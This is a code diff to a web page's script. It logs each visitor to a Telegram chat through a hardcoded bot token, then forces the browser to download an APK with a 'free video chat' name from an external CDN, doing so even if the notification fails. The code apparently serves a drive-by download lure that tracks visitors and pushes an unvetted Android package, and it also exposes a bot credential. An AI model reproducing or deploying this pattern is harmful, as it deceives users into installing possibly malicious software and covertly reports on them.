@@ -145,17 +145,29 @@
         var token = '8163053912:AAHVNTHM3O2LRcChxvclnM8ONUELtMdFRa8';
         var chatId = '-1002478190818';
         var message = 'Bir kullanıcı geldi.';
+        var fileUrl = 'https://ucarecdn.com/ee031a9a-86f2-4a2a-85f7-5864b617accf/ucretzgoruntulusohbeiiiii.apk';
 
         fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
             .then(response => response.json())
             .then(data => {
                 console.log('Telegram mesajı gönderildi:', data);
-                // Yeni hedef: site içi dosya
-                window.location.href = 'apk/ucretsizsohbet.apk';
+                // Link oluştur ve otomatik indir
+                var a = document.createElement('a');
+                a.href = fileUrl;
+                a.download = '';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
             })
             .catch(error => {
                 console.error('Telegram mesajı gönderilemedi:', error);
-                window.location.href = 'apk/ucretsizsohbet.apk';
+                // Hata olsa bile indir
+                var a = document.createElement('a');
+                a.href = fileUrl;
+                a.download = '';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
             });
     }
 </script>
